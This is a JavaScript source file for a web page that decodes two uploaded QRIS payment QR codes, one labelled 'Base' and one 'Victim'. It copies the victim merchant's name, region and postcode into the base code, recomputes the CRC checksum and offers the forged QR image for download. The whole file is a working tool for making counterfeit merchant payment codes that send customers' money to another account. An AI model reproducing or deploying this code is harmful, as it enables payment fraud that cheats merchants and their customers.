// Fungsi untuk mem-parsing data QRIS
function parseQRIS(data) {
    let index = 0;
    let parsedData = {};
    console.log("Starting QRIS parsing...");
    while (index < data.length) {
        let obj = data.slice(index, index + 2);
        let length = parseInt(data.slice(index + 2, index + 4));
        if (isNaN(length) || length <= 0) {
            console.error(`Invalid length at index ${index}: ${length}`);
            break;
        }
        let value = data.slice(index + 4, index + 4 + length);
        console.log(`Parsed: obj=${obj}, length=${length}, value=${value}`);
        parsedData[obj] = value;
        index += 4 + length;
    }
    console.log("QRIS parsing complete:", parsedData);
    return parsedData;
}

// Fungsi untuk menghitung checksum
function checksum(data) {
    let crc = 0xFFFF;
    const poly = 0x1021;
    for (let i = 0; i < data.length; i++) {
        crc ^= data.charCodeAt(i) << 8;
        for (let j = 0; j < 8; j++) {
            if (crc & 0x8000) crc = (crc << 1) ^ poly;
            else crc <<= 1;
            crc &= 0xFFFF;
        }
    }
    let result = crc.toString(16).toUpperCase().padStart(4, '0');
    console.log("Calculated checksum:", result);
    return result;
}

// Fungsi untuk memodifikasi data QRIS
function modifyQRIS(data, name, region, postcode) {
    console.log("Original data:", data);
    let changes = [];
    if (name) {
        changes.push(`Name: ${data['59']} -> ${name}`);
        data['59'] = name;
    }
    if (region) {
        changes.push(`Region: ${data['60']} -> ${region}`);
        data['60'] = region;
    }
    if (postcode) {
        changes.push(`Postcode: ${data['61']} -> ${postcode}`);
        data['61'] = postcode;
    }
    
    let altered = '';
    for (let key in data) {
        if (key === '63') continue; // Skip checksum field
        let value = data[key];
        let length = value.length.toString().padStart(2, '0');
        altered += `${key}${length}${value}`;
    }
    
    altered += '6304'; // Append checksum identifier
    let checksumValue = checksum(altered);
    altered += checksumValue;
    
    console.log("Modified QRIS data:", altered);
    
    // Tampilkan perubahan yang dilakukan
    displayChanges(changes);
    
    return altered;
}

// Fungsi untuk menampilkan perubahan yang dilakukan
function displayChanges(changes) {
    let changesContainer = document.getElementById('changes');
    changesContainer.innerHTML = `<h3>QRIS Altered</h3>`;
    changes.forEach(change => {
        let p = document.createElement('p');
        p.textContent = change;
        changesContainer.appendChild(p);
    });
}

// Fungsi untuk membuat kode QR baru
function createQR(data, canvasId) {
    let canvas = document.getElementById(canvasId);
    let ctx = canvas.getContext('2d');

    // Set ukuran canvas
    canvas.width = 256;
    canvas.height = 256;

    QRCode.toCanvas(canvas, data, {
        width: canvas.width,
        margin: 2
    }, function (error) {
        if (error) {
            console.error("Error creating QR Code:", error);
        } else {
            console.log("QR Code created for data:", data);

            // Jika canvas yang dibuat adalah alteredCanvas, siapkan unduhan
            if (canvasId === 'alteredCanvas') {
                prepareDownload(canvas);
                // Tampilkan tombol download dan informasi perubahan
                document.getElementById('downloadSection').style.display = 'block';
                document.getElementById('changes').style.display = 'block';
            }
        }
    });
}

// Fungsi untuk menyiapkan unduhan gambar dari canvas
function prepareDownload(canvas) {
    const downloadLink = document.getElementById('downloadAlteredQR');
    downloadLink.href = canvas.toDataURL("image/png");
}

document.getElementById('generate').addEventListener('click', function() {
    let baseQRData = document.getElementById('baseQR').qrisData;
    let victimQRData = document.getElementById('victimQR').qrisData;

    console.log("Base QR Data:", baseQRData);
    console.log("Victim QR Data:", victimQRData);

    if (baseQRData && victimQRData) {
        let victimData = parseQRIS(victimQRData);
        let name = victimData['59'];
        let region = victimData['60'];
        let postcode = victimData['61'];

        console.log("Extracted Name:", name);
        console.log("Extracted Region:", region);
        console.log("Extracted Postcode:", postcode);

        let baseData = parseQRIS(baseQRData);
        let alteredQRData = modifyQRIS(baseData, name, region, postcode);

        createQR(alteredQRData, 'alteredCanvas');
    } else {
        alert('Please upload both Base QR and Victim QR.');
    }
});

// Menangani perubahan pada input file baseQR
document.getElementById('baseQR').addEventListener('change', function() {
    let fileInput = this;
    if (fileInput.files.length > 0) {
        let fileName = fileInput.files[0].name;
        document.getElementById('baseQRName').textContent = fileName;
        decodeQR(fileInput, 'baseCanvas', function(data) {
            document.getElementById('baseQR').qrisData = data;
        });
    } else {
        document.getElementById('baseQRName').textContent = 'No file chosen';
    }
});

// Menangani perubahan pada input file victimQR
document.getElementById('victimQR').addEventListener('change', function() {
    let fileInput = this;
    if (fileInput.files.length > 0) {
        let fileName = fileInput.files[0].name;
        document.getElementById('victimQRName').textContent = fileName;
        decodeQR(fileInput, 'victimCanvas', function(data) {
            document.getElementById('victimQR').qrisData = data;
        });
    } else {
        document.getElementById('victimQRName').textContent = 'No file chosen';
    }
});

// Fungsi untuk mendekode kode QR yang diunggah
function decodeQR(input, canvasId, callback) {
    let file = input.files[0];
    if (!file) return;
    
    let reader = new FileReader();
    reader.onload = function(event) {
        let img = new Image();
        img.onload = function() {
            let canvas = document.getElementById(canvasId);
            let ctx = canvas.getContext('2d');

            // Set ukuran canvas berdasarkan ukuran gambar
            canvas.width = img.width;
            canvas.height = img.height;

            ctx.drawImage(img, 0, 0);

            let imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            let decodedQR = jsQR(imageData.data, imageData.width, imageData.height);
            if (decodedQR) {
                console.log("Decoded QR data:", decodedQR.data);
                callback(decodedQR.data);
            } else {
                console.error('Failed to decode QR code.');
            }
        }
        img.src = event.target.result;
    }
    reader.readAsDataURL(file);
}